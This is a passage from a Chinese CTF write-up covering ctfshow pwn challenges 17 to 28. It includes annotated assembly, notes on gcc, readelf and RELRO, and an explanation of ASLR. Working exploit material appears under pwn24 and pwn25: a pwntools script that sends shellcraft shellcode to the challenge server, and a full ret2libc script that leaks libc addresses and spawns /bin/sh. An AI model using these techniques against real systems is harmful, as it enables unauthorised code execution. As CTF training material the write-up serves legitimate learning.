寄存器设置为当前栈帧的起始地址，并且偏移量为 8</span><br><span class="line">	ret ;从函数中返回到调用者处执行下一条指令</span><br><span class="line">	.cfi_endproc ;标记一个函数的结尾</span><br><span class="line">.LFE0: ;.LFE0: 是一个标签（Label），它通常用于标记函数的结尾</span><br><span class="line">	.size	ctfshow, .-ctfshow  ;是汇编器生成目标文件时使用的一条指令，用来记录 ctfshow 符号的大小，以便在后续的链接过程和调试过程中正确地处理和使用这个符号</span><br><span class="line">	.section	.rodata</span><br><span class="line">.LC1:</span><br><span class="line">	.string	&quot;%2hhx&quot; ;%：格式说明符的起始符号。2：表示输出至少两位字符宽度。如果输出的十六进制数不足两位，则在前面补零。hh：表示将参数视为 char 类型，并将其作为无符号数打印。x：表示将参数作为十六进制数输出</span><br><span class="line">	.text ;定义全局函数main</span><br><span class="line">	.globl	main</span><br><span class="line">	.type	main, @function</span><br><span class="line">main:</span><br><span class="line">.LFB1:</span><br><span class="line">	.cfi_startproc</span><br><span class="line">	pushq	%rbp ;将 64 位数据（即寄存器 %rbp 的值）压入栈顶的指令</span><br><span class="line">	.cfi_def_cfa_offset 16 ;CFA 的地址可以通过当前栈顶加上 16 来计算得出</span><br><span class="line">	.cfi_offset 6, -16  ;将 %rbp 寄存器的旧值保存到偏移量为 -16 的位置</span><br><span class="line">	movq	%rsp, %rbp  ;将%rsp的值复制给%rbp，建立新的栈帧</span><br><span class="line">	.cfi_def_cfa_register 6  ;将当前栈帧的基址指针设置为 %rbp 寄存器</span><br><span class="line">	subq	$64, %rsp  ;%rsp是栈顶指针，将当前函数的栈帧大小增加 64 字节，以便在栈上为局部变量、临时数据或者其他需要的空间分配足够的内存</span><br><span class="line">	movq	%fs:40, %rax ;%fs 寄存器通常用于指向线程本地存储 (TLS) 区域。从当前线程的 TLS 区域的偏移量为 40 的位置读取数据，并将其存储到 %rax 寄存器中</span><br><span class="line">	movq	%rax, -8(%rbp) ;将%rax的值存储到%rbp的-8处</span><br><span class="line">	xorl	%eax, %eax ;将 %eax 寄存器的值与自身进行按位异或运算（XOR），并将结果存储回 %eax。因为任何数与自身进行 XOR 运算的结果都是 0，所以这条指令的作用就是将 %eax 置为 0。这是一种常见的优化写法，比使用 movl $0, %eax 要高效一些，因为它不需要将立即数 0 加载到指令流中</span><br><span class="line">	movabsq	$4122593792332543030, %rax ;将十六进制的 0x3938373635343332 （即十进制的 4122593792332543030）加载到 %rax 寄存器中</span><br><span class="line">	movabsq	$3834596513518335287, %rdx ;将十六进制的 0x3938373635343332加载到 %rdx 寄存器中</span><br><span class="line">	movq	%rax, -32(%rbp) ;将%rax的值存储到%rbp的-32处</span><br><span class="line">	movq	%rdx, -24(%rbp) ;将%rax的值存储到%rbp的-24处</span><br><span class="line">	movl	$825635894, -16(%rbp) ;将825635894存储到%rbp的-16处</span><br><span class="line">	movb	$0, -12(%rbp) ;将0存储到%rbp的-12处</span><br><span class="line">	movl	$0, -52(%rbp) ;将0存储到%rbp的-52处</span><br><span class="line">	jmp	.L5 ;跳转到.L5</span><br><span class="line">	</span><br><span class="line">.L6:</span><br><span class="line">	leaq	-48(%rbp), %rdx  ;将栈帧指针 %rbp 减去 48 的地址值加载到 %rdx 中</span><br><span class="line">	movl	-52(%rbp), %eax  ;将%rbp的-52的值存储到%eax中</span><br><span class="line">	cltq ;将 32 位的 EAX 寄存器中的值扩展到 64 位的 RAX 寄存器中。扩展时会保留符号位，也就是说，如果 EAX 中的值是负数，扩展后 RAX 中的高 32 位会填充符号位（即 1）；如果是正数，高 32 位会填充 0。</span><br><span class="line">	addq	%rax, %rdx ;将%rax与%rdx的值相加</span><br><span class="line">	movl	-52(%rbp), %eax ;将%rbp的-52的值存储到%eax中</span><br><span class="line">	addl	%eax, %eax ;将%eax与%eax的值相加</span><br><span class="line">	leaq	-32(%rbp), %rcx ;将栈帧指针 %rbp 减去 32 的地址值加载到 %rdx 中</span><br><span class="line">	cltq   ;将 32 位的 EAX 寄存器中的值扩展到 64 位的 RAX 寄存器中。</span><br><span class="line">	addq	%rcx, %rax ;将%rcx的值与%rax的值相加</span><br><span class="line">	leaq	.LC1(%rip), %rsi ;将计算得到的 .LC1 的地址（相对于当前指令的 %rip 的偏移量）存储到 %rsi 寄存器中</span><br><span class="line">	movq	%rax, %rdi ;将 64 位寄存器 rax 的值移动到 64 位寄存器 rdi 的指令</span><br><span class="line">	movl	$0, %eax ;将%eax的值赋值为0</span><br><span class="line">	call	__isoc99_sscanf@PLT ;调用scanf函数</span><br><span class="line">	addl	$1, -52(%rbp) ;将1与%rbp的-52相加，结果返回到%rbp的-52中</span><br><span class="line">	</span><br><span class="line">.L5:</span><br><span class="line">	cmpl	$15, -52(%rbp)  ;将立即数 15 与位于栈帧中 %rbp 寄存器偏移 -52 处的值进行比较</span><br><span class="line">	jle	.L6 ;如果%rbp中的数小于等于15就跳转到.L6</span><br><span class="line">	leaq	-48(%rbp), %rax ;将栈帧指针 %rbp 减去 48 的地址值加载到 %rax</span><br><span class="line">	movq	%rax, %rdi ;将%rax的值加载到%rdi中</span><br><span class="line">	call	ctfshow  ;调用ctfshow函数</span><br><span class="line">	movl	$0, %eax ;将0赋值给%eax</span><br><span class="line">	movq	-8(%rbp), %rsi ;将栈帧指针 %rbp 减去 8 的地址值加载到 %rsi</span><br><span class="line">	xorq	%fs:40, %rsi ;将 %rsi 寄存器中的值与 %fs:40 的内容进行按位异或运算，并将结果存储回 %rsi 寄存器中</span><br><span class="line">	je	.L8 ;如果异或结果为0，跳转到.L8</span><br><span class="line">	call	__stack_chk_fail@PLT ;调用__stack_chk_fail函数。__stack_chk_fail 是一个内置的函数，用于检测栈的完整性</span><br><span class="line">	</span><br><span class="line">.L8:</span><br><span class="line">	leave ;恢复调用函数的栈帧</span><br><span class="line">	.cfi_def_cfa 7, 8 ;将 %rsp 寄存器设置为当前栈帧的起始地址，并且偏移量为 8</span><br><span class="line">	ret ;返回调用</span><br><span class="line">	.cfi_endproc ;标记一个函数的结尾</span><br><span class="line">.LFE1: ;标记一个函数的结尾</span><br><span class="line">	.size	main, .-main ;定义 main 函数的大小</span><br><span class="line">	.ident	&quot;GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0&quot; ;嵌入一个标识符字符串到输出文件中。这里的字符串显示了使用的编译器及其版本信息。</span><br><span class="line">	.section	.note.GNU-stack,&quot;&quot;,@progbits ;声明一个新的段（section）。这里的 .note.GNU-stack 是一个特殊的段名，用来指定栈的属性。@progbits 是一个段属性，表示段包含程序数据（PROG). 此段用于控制是否需要栈保护，为空表示不需要</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="gcc编译器小知识"><a href="#gcc编译器小知识" class="headerlink" title="gcc编译器小知识"></a>gcc编译器小知识</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gcc -c 生成.o文件</span><br><span class="line">gcc -S 生成.s文件</span><br><span class="line">gcc -o 生成可执行文件</span><br><span class="line">gcc 源文件名 -o 输出文件名，例如 gcc hello.c -o hello，这是最简单的一步到位的编译方式。</span><br><span class="line">gcc -E 源文件名 -o 预处理文件名，例如 gcc -E hello.c -o hello.i，这是预处理阶段，会展开头文件，替换宏，过滤注释。</span><br><span class="line">gcc -S 预处理文件名 -o 汇编文件名，例如 gcc -S hello.i -o hello.s，这是编译阶段，会将源文件编译成汇编代码。</span><br><span class="line">gcc -c 汇编文件名 -o 目标文件名，例如 gcc -c hello.s -o hello.o，这是汇编阶段，会将汇编代码转换成二进制文件。</span><br><span class="line">gcc 目标文件名 -o 可执行文件名，例如 gcc hello.o -o hello，这是链接阶段，会将二进制文件打包成可执行文件。</span><br></pre></td></tr></table></figure>
+
+<h5 id="x86-64小知识"><a href="#x86-64小知识" class="headerlink" title="x86-64小知识"></a>x86-64小知识</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">在x86汇编语言中，l 通常是指示操作数或指令的大小。具体来说：</span><br><span class="line">l 表示使用32位操作数大小。在x86汇编中，指令操作数的大小可以是字节（b）、字（w）、双字（l）或四字（q）。</span><br><span class="line">b 表示字节（8位）操作数。</span><br><span class="line">w 表示字（16位）操作数。</span><br><span class="line">l 表示双字（32位）操作数。</span><br><span class="line">q 表示四字（64位）操作数。</span><br><span class="line"></span><br><span class="line">x86-64 架构的寄存器编号：</span><br><span class="line">0: %rax</span><br><span class="line">1: %rdx</span><br><span class="line">2: %rcx</span><br><span class="line">3: %rbx</span><br><span class="line">4: %rsi</span><br><span class="line">5: %rdi</span><br><span class="line">6: %rbp</span><br><span class="line">7: %rsp</span><br><span class="line">8: %r8</span><br><span class="line">9: %r9</span><br><span class="line">10: %r10</span><br><span class="line">11: %r11</span><br><span class="line">12: %r12</span><br><span class="line">13: %r13</span><br><span class="line">14: %r14</span><br><span class="line">15: %r15</span><br><span class="line">%rax, %rbx, %rcx, %rdx, %rsi, %rdi, %r8 到 %r15：这些寄存器是通用的、多用途的寄存器。它们用于存放整数数据、地址和函数参数传递。例如：</span><br><span class="line">%rax 通常用于存放函数返回值或者用于算术运算的结果。</span><br><span class="line">%rbx, %rcx, %rdx 等可用于一般目的的数据操作。</span><br><span class="line">%rsi, %rdi 用于传递函数参数。</span><br><span class="line">%r8 到 %r15 用于更多的通用数据存储。</span><br><span class="line">%rsp：栈指针寄存器，指向当前栈顶的地址。在函数调用时，用于管理函数调用的栈帧，包括局部变量和函数返回地址等。</span><br><span class="line">基址指针寄存器：</span><br><span class="line">%rbp：基址指针寄存器，用于指向当前函数的栈帧基址。在函数执行时，%rbp 指向函数栈帧的起始地址，帮助访问局部变量和参数。</span><br><span class="line">可以认为rsp是栈顶指针，而rbp是栈底指针</span><br><span class="line"></span><br><span class="line">索引寄存器：</span><br><span class="line">%rsi, %rdi：这两个寄存器通常用于存放函数参数。在调用函数时，参数可以通过这些寄存器传递给被调用的函数。</span><br><span class="line">程序计数器寄存器：</span><br><span class="line">%rip：程序计数器寄存器，存储下一条将要执行的指令地址。在执行过程中%rip 自动更新到下一条指令的地址，实现指令的顺序执行。</span><br></pre></td></tr></table></figure>
+
+<h4 id="pwn17"><a href="#pwn17" class="headerlink" title="pwn17"></a>pwn17</h4><p>主要看源码的case2部分，case3虽然可以拿到，但是需要等待114514s，所以不考虑，</p>
+<p><img src="/2024/06/28/pwn0-34/image-20240623174323938.png" alt="image-20240623174323938"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">case2的意思就是可以输出绝对路径来执行命令，那就可以获得shell了</span><br><span class="line">/c*</span><br><span class="line">/bin/sh</span><br><span class="line">/bin/bash</span><br><span class="line">/bin/ls</span><br></pre></td></tr></table></figure>
+
+<h4 id="pwn18"><a href="#pwn18" class="headerlink" title="pwn18"></a>pwn18</h4><p>知识点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; 用于覆盖写入文件，会清空文件内容再写入新的输出。</span><br><span class="line">&gt;&gt; 用于追加写入文件，不会清空文件内容，而是在文件末尾添加新的输出。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2024/06/28/pwn0-34/image-20240623180811825.png" alt="image-20240623180811825"></p>
+<p>题目很简单，就是输入一个9就可以了，如果是fake函数的话就会使用&gt;&gt;追加在flag后面，real则会使用&gt;重写文件</p>
+<h4 id="pwn19"><a href="#pwn19" class="headerlink" title="pwn19"></a>pwn19</h4><p><img src="/2024/06/28/pwn0-34/image-20240623214452281.png" alt="image-20240623214452281"></p>
+<p>使用fork()函数创建了子进程<br>就是如果成功创建了子进程的话会同时运行if和else的两个部分的意思，这里由于关闭了输出流所以看不到回显，但是可以通过将重定向绑定的方式将正确输出与输入或者错误输出绑定来得到回显</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls &gt;&amp;2</span><br><span class="line">ls &gt;&amp;0</span><br></pre></td></tr></table></figure>
+
+<h4 id="pwn20"><a href="#pwn20" class="headerlink" title="pwn20"></a>pwn20</h4><p><img src="/2024/06/28/pwn0-34/image-20240624001545508.png" alt="image-20240624001545508"></p>
+<p><img src="/2024/06/28/pwn0-34/image-20240624001936069.png" alt="image-20240624001936069"></p>
+<p>可以看到relro(relocation_read_only)为no，也就是.got和.got.plt都可写，通过readelf -S命令可以查看到符号表，获得.got和.got.plt的地址</p>
+<p>flag为ctfshow{1_1_0x600f18_0x600f28}</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用checksec --file=filename命令查看got和plt是否可写</span><br><span class="line">当RELRO为Partial RELRO时，表示.got不可写而.got.plt可写。</span><br><span class="line">当RELRO为FullRELRO时，表示.got不可写.got.plt也不可写。</span><br><span class="line">当RELRO为No RELRO时，表示.got与.got.plt都可写。</span><br></pre></td></tr></table></figure>
+
+<h4 id="pwn21"><a href="#pwn21" class="headerlink" title="pwn21"></a>pwn21</h4><p><img src="/2024/06/28/pwn0-34/image-20240624002234003.png" alt="image-20240624002234003"></p>
+<p><img src="/2024/06/28/pwn0-34/image-20240624002253765.png" alt="image-20240624002253765"></p>
+<p>同上，可以得到flag为ctfshow{0_1_0x600ff0_0x601000}</p>
+<h4 id="pwn22"><a href="#pwn22" class="headerlink" title="pwn22"></a>pwn22</h4><p><img src="/2024/06/28/pwn0-34/image-20240624002629355.png" alt="image-20240624002629355"></p>
+<p>同上，flag为ctfshow{0_0_0x600fc0}</p>
+<h4 id="pwn23"><a href="#pwn23" class="headerlink" title="pwn23"></a>pwn23</h4><p>生成的flag的位置为0x804b060，不过其实没什么用，好吧，可能有点用？在用ida调试了两个小时之后，终于发现了题目的flag是怎么出现的</p>
+<p><img src="/2024/06/28/pwn0-34/image-20240625221432508.png" alt="image-20240625221432508"></p>
+<p><img src="/2024/06/28/pwn0-34/image-20240625222259827.png" alt="image-20240625222259827"></p>
+<p><img src="/2024/06/28/pwn0-34/image-20240625222411571.png" alt="image-20240625222411571"><img src="/2024/06/28/pwn0-34/image-20240625222611418.png" alt="image-20240625222611418"></p>
+<p><img src="/2024/06/28/pwn0-34/image-20240625223000027.png" alt="image-20240625223000027"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">问题出现在__unwind函数上，在第一次运行到jnz时会跳转到左边，因为[ebp+stream]!=0。在程序抛出异常的时候会再次回溯到__unwind函数的部分，就是溢出的时候，会抛出错误(31313131是因为我取的flag是ctfshow&#123;11111111-1111-1111-111111111111&#125;)。在抛出异常之后，就会触发__unwind函数。抛出异常之后选yes，会将异常传递给远程调试的程序(这里使用的是window+linux虚拟机远程调试)。可以发现此时eip已经到了__unwind函数的第一行。在新的__unwind函数部分直接是使用fprintf输出了flag，然后结束程序(就是抛出异常后跳转到了sigsegv_handler函数)</span><br></pre></td></tr></table></figure>
+
+<p>具体到题目</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用ssh连接上之后，可以ls /，发现flag但是无法读取，没有权限</span><br><span class="line">ls发现只有一个pwnme，其实也尝试了一下suid，发现没有能用的</span><br><span class="line">payload:</span><br><span class="line">./pwnme 111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="readelf小技巧"><a href="#readelf小技巧" class="headerlink" title="readelf小技巧"></a>readelf小技巧</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">readelf -a 显示全部信息</span><br><span class="line">readelf -h 显示文件头</span><br><span class="line">readelf -l 显示程序头</span><br><span class="line">readelf -S 显示Section头</span><br><span class="line">readelf -e 全部头</span><br><span class="line">等同于-h -l -S，显示三个头部信息。</span><br><span class="line">readelf -s 显示符号表</span><br><span class="line">readelf -n 显示内核注释</span><br><span class="line">readelf -r 显示重定位信息</span><br><span class="line">readelf -d 显示动态段信息</span><br><span class="line">readelf -V 显示elf文件的版本信息</span><br><span class="line">readelf -A 显示CPU架构信息</span><br><span class="line">readelf -x &lt;section_number/section_name&gt; elfname 16进制展示指定段</span><br></pre></td></tr></table></figure>
+
+<h4 id="pwn24"><a href="#pwn24" class="headerlink" title="pwn24"></a>pwn24</h4><p>ida反编译main函数之后，发现其实就只有一个ctfshow是有用的，可以传入参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">ctfshow函数</span><br><span class="line">; __unwind &#123;</span><br><span class="line">push    ebp     </span><br><span class="line">mov     ebp, esp</span><br><span class="line">push    ebx     </span><br><span class="line">sub     esp, 84h ;保存旧函数的栈底地址，生成新函数的栈</span><br><span class="line">call    __x86_get_pc_thunk_bx ;获取下一条指令的地址赋值给ebx</span><br><span class="line">add     ebx, (offset _GLOBAL_OFFSET_TABLE_ - $) ;offset _GLOBAL_OFFSET_TABLE_ - $计算从当前指令地址到全局偏移表的偏移量，再加上ebx中是当前地址，就可以获取全局偏移表的真实地址</span><br><span class="line">sub     esp, 4 ;分配4个字节的栈空间</span><br><span class="line">push    100h            ; nbytes 256字节</span><br><span class="line">lea     eax, [ebp+buf]</span><br><span class="line">push    eax             ; buf</span><br><span class="line">push    0               ; fd</span><br><span class="line">call    _read    ;_read需要三个参数，也就是push到栈里的100h(字节数)，eax(存放读取内容的地址)，fd(文件描述符，标准输入)</span><br><span class="line">add     esp, 10h </span><br><span class="line">sub     esp, 0Ch ;调节栈的大小</span><br><span class="line">lea     eax, [ebp+buf] ;获取buf的地址赋值给eax，作为_puts的参数</span><br><span class="line">push    eax             ; s</span><br><span class="line">call    _puts</span><br><span class="line">add     esp, 10h</span><br><span class="line">lea     eax, [ebp+buf]</span><br><span class="line">call    eax ; 调用eax，所以只需要往eax写入恶意代码就可</span><br><span class="line">nop</span><br><span class="line">mov     ebx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">retn</span><br><span class="line">; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>具体到题目，根据提示，使用pwntools的shellcraft模块生成shellcode即可，不过在栈中实行函数取决于NX选项的开启与否，NX选项开启的话就禁止堆栈执行了，不能直接执行shellcode(使用checksec可以看到nx为no)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">pwn24.py</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"># 与目标服务器的pwn文件建立进程</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28178&quot;) </span><br><span class="line"></span><br><span class="line"># 使用shellcraft模块生成shellcode</span><br><span class="line">shell = asm(shellcraft.sh()) </span><br><span class="line"># 向远程发送数据（我们的shellcode）</span><br><span class="line">p.sendline(shell)</span><br><span class="line"># 建立交互式对话</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">网上找的，最好在linux上运行pwn，在windows可能需要多安装一些程序，比较麻烦</span><br></pre></td></tr></table></figure>
+
+<h4 id="pwn25"><a href="#pwn25" class="headerlink" title="pwn25"></a>pwn25</h4><p><img src="/2024/06/28/pwn0-34/image-20240627143554584.png" alt="image-20240627143554584"></p>
+<table>
+<thead>
+<tr>
+<th>栈结构</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>（高位地址）</td>
+</tr>
+<tr>
+<td>main栈</td>
+</tr>
+<tr>
+<td>ctfshow栈</td>
+</tr>
+<tr>
+<td>read栈</td>
+</tr>
+<tr>
+<td>参数1</td>
+</tr>
+<tr>
+<td>参数2</td>
+</tr>
+<tr>
+<td>参数3 ——1</td>
+</tr>
+<tr>
+<td>call read的下一条指令的地址 ——2</td>
+</tr>
+<tr>
+<td>当前ebp ——3</td>
+</tr>
+<tr>
+<td>buf ——4</td>
+</tr>
+<tr>
+<td>当前esp</td>
+</tr>
+<tr>
+<td>（低位地址）</td>
+</tr>
+<tr>
+<td></td>
+</tr>
+</tbody></table>
+<p><img src="/2024/06/28/pwn0-34/image-20240627231352304.png" alt="image-20240627231352304"></p>
+<p>read函数溢出(因为buf只有88h，但是可以输入的字节数是100h)，所以可以一直写出buf的范围，覆盖掉1，2，3，4四个部分</p>
+<p>现在的目的有两个，第一个是获取puts在libc库中的地址，第二个是获取system在libc库中的地址(由于这个程序里面是没有调用system的，所以无法直接获取system的地址)</p>
+<p>第一次覆盖后的栈</p>
+<table>
+<thead>
+<tr>
+<th>栈结构</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>（高位地址）</td>
+</tr>
+<tr>
+<td>main栈</td>
+</tr>
+<tr>
+<td>ctfshow栈</td>
+</tr>
+<tr>
+<td>read栈</td>
+</tr>
+<tr>
+<td>参数1</td>
+</tr>
+<tr>
+<td>puts_got ——(1)</td>
+</tr>
+<tr>
+<td>main_addr ——1 ——(2)</td>
+</tr>
+<tr>
+<td>puts_plt ——2 ——(3)</td>
+</tr>
+<tr>
+<td>offset*’a’ ——3,4</td>
+</tr>
+<tr>
+<td>当前esp</td>
+</tr>
+<tr>
+<td>（低位地址）</td>
+</tr>
+</tbody></table>
+<p>(1),(2),(3)三部分构成了一个新的栈帧，调用了puts_plt（puts函数），返回main_addr（main函数），参数为puts_got（puts函数的参数），调用system函数时同理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">#p = remote(&quot;pwn.challenge.ctf.show&quot;,&quot;28309&quot;)</span><br><span class="line">elf = ELF(&quot;../pwn25&quot;)  # 从附件中获取</span><br><span class="line"></span><br><span class="line">offset = 0x88 + 0x4 # 3,4两个部分的大小之和</span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]  # 获得main的地址，plt表中puts函数的位置，got表中puts的位置</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">print(main_addr,puts_plt,puts_got)</span><br><span class="line"># 获得puts函数在内存中的地址</span><br><span class="line">payload = offset*b&#x27;a&#x27; + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;,puts_addr)</span><br><span class="line"># 根据libc库中的puts函数的偏移可以计算出libc的基址，从而获得system函数的地址和字符串/bin/sh的地址</span><br><span class="line">libc_base = puts_addr - libc.dump(&quot;puts&quot;)</span><br><span class="line">print(hex(libc_base))</span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(system_addr) + b&#x27;a&#x27; * 4 + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tips:PLT表和GOT表是一一对应的，GOT表中存的是函数的实际地址，而PLT表中存的是函数GOT表的地址</span><br><span class="line"></span><br><span class="line">计算libc基址</span><br><span class="line">libc基地址 = 函数实际地址 – 函数在libc库中的偏移地址</span><br><span class="line">system_addr = libc基地址 + system在libc库中的偏移地址</span><br><span class="line"></span><br><span class="line">利用ret2libc需解决的问题</span><br><span class="line">程序中有可输出地址内容的函数，如：puts()；</span><br><span class="line">计算libc基址；</span><br><span class="line">找到 system() 函数的地址；</span><br><span class="line">找到 “/bin/sh” 这个字符串的地址。</span><br></pre></td></tr></table></figure>
+
+<h4 id="pwn26-28"><a href="#pwn26-28" class="headerlink" title="pwn26-28"></a>pwn26-28</h4><p>感觉就是让你认识一下ASLR这个知识点，在自己的虚拟机上修改一下这个文件的值然后跑一下，如果跑出来不对就直接找flag交就好</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">ASLR（Address Space Layout Randomization）是一种计算机安全技术，用于防止缓冲区溢出等内存漏洞的利用。其原理是在每次程序加载时随机化程序内存的关键部分地址，包括堆、栈、动态链接库和程序本身的代码段等。这使得攻击者很难预测和利用内存地址，从而增加了攻击的难度。</span><br><span class="line"></span><br><span class="line">ASLR的工作机制</span><br><span class="line"></span><br><span class="line">1. 堆地址随机化：堆的起始地址在每次程序运行时都会随机化。</span><br><span class="line">2. 栈地址随机化：栈的起始地址在每次程序运行时都会随机化。</span><br><span class="line">3. 动态链接库地址随机化：动态链接库（如libc等）的加载地址在每次程序运行时都会随机化。</span><br><span class="line">4. 程序代码段地址随机化：程序本身的代码段起始地址也会被随机化。</span><br><span class="line"></span><br><span class="line">ASLR的优点</span><br><span class="line"></span><br><span class="line">- 增加攻击难度：由于内存地址随机化，攻击者无法轻易预测内存布局，从而增加了漏洞利用的复杂度。</span><br><span class="line">- 降低成功率：即使攻击者找到了漏洞，由于内存地址的不确定性，成功利用漏洞的几率大大降低。</span><br><span class="line"></span><br><span class="line">ASLR的缺点</span><br><span class="line"></span><br><span class="line">- 性能开销：地址随机化可能会带来一定的性能开销，虽然通常这并不显著。</span><br><span class="line">- 兼容性问题：某些依赖固定地址的程序可能会因为ASLR而运行异常。</span><br><span 